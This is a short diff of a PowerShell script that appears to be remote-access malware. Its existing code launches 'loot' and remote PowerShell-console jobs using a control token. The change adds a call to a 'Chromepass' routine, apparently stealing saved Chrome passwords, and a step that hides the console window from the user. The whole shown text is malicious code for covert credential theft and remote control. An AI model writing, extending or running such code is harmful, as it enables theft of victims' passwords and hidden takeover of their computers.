@@ -1505,6 +1505,15 @@ function StartAll{
     Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
     sleep 1
     Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
+    
+    # Run Chromepass function once
+    Chromepass
+}
+
+# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
+# Hide the console
+If ($hideconsole -eq 1){ 
+    HideWindow
 }
 
 Function ConnectMsg {
